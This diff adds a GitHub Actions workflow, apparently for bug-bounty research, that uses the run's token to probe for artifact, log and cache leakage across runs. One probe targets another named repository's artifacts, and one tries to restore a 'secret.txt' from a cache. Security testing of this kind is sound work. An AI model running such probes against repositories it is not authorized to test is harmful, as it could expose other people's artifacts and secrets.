@@ -1,0 +1,90 @@
+# Owner-authorized B01 research — GITHUB_TOKEN artifact/cache/log probes.
+name: Bounty artifact IDOR probe (GITHUB_TOKEN)
+on:
+  workflow_dispatch:
+    inputs:
+      victim_artifact_id:
+        description: Artifact ID from a prior seed run (same repo)
+        required: true
+      victim_run_id:
+        description: Run ID that produced the artifact
+        required: true
+      other_run_id:
+        description: Different run ID for log/cache bleed tests
+        required: true
+      cache_restore_key:
+        description: Cache key from victim seed run
+        required: true
+
+permissions:
+  contents: read
+  actions: read
+
+jobs:
+  token_probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: API probes with GITHUB_TOKEN
+        env:
+          GH_TOKEN: ${{ github.token }}
+          VICTIM_ARTIFACT_ID: ${{ inputs.victim_artifact_id }}
+          VICTIM_RUN_ID: ${{ inputs.victim_run_id }}
+          OTHER_RUN_ID: ${{ inputs.other_run_id }}
+          CACHE_KEY: ${{ inputs.cache_restore_key }}
+        run: |
+          set -euo pipefail
+          probe() {
+            local label="$1"
+            local url="$2"
+            local accept="${3:-application/vnd.github+json}"
+            echo "=== TOKEN_PROBE ${label} ==="
+            code=$(curl -sS -o /tmp/probe-body -w "%{http_code}" \
+              -H "Authorization: Bearer ${GH_TOKEN}" \
+              -H "Accept: ${accept}" \
+              "${url}")
+            echo "HTTP ${code} bytes=$(wc -c </tmp/probe-body)"
+            head -c 120 /tmp/probe-body | tr -d '\0' || true
+            echo
+          }
+
+          REPO="${GITHUB_REPOSITORY}"
+          probe "artifact_zip_same_repo" \
+            "https://api.github.com/repos/${REPO}/actions/artifacts/${VICTIM_ARTIFACT_ID}/zip" \
+            "application/vnd.github+json"
+
+          probe "artifact_meta" \
+            "https://api.github.com/repos/${REPO}/actions/artifacts/${VICTIM_ARTIFACT_ID}"
+
+          probe "logs_victim_run" \
+            "https://api.github.com/repos/${REPO}/actions/runs/${VICTIM_RUN_ID}/logs"
+
+          probe "logs_other_run" \
+            "https://api.github.com/repos/${REPO}/actions/runs/${OTHER_RUN_ID}/logs"
+
+          probe "jobs_victim_run" \
+            "https://api.github.com/repos/${REPO}/actions/runs/${VICTIM_RUN_ID}/jobs"
+
+          probe "jobs_other_run" \
+            "https://api.github.com/repos/${REPO}/actions/runs/${OTHER_RUN_ID}/jobs"
+
+          probe "cross_repo_calculator_artifact_same_id" \
+            "https://api.github.com/repos/kiskecske24/Calculator/actions/artifacts/${VICTIM_ARTIFACT_ID}/zip"
+
+      - name: Cache restore bleed (other run's key)
+        uses: actions/cache/restore@v4
+        id: cache_restore
+        with:
+          path: /tmp/bounty-cache-restore
+          key: ${{ inputs.cache_restore_key }}
+          restore-keys: |
+            ${{ inputs.cache_restore_key }}
+
+      - name: Report cache restore outcome
+        run: |
+          echo "cache_hit=${{ steps.cache_restore.outputs.cache-hit }}"
+          if [ -f /tmp/bounty-cache-restore/secret.txt ]; then
+            echo "cache_file_present=yes"
+            wc -c /tmp/bounty-cache-restore/secret.txt
+          else
+            echo "cache_file_present=no"
+          fi
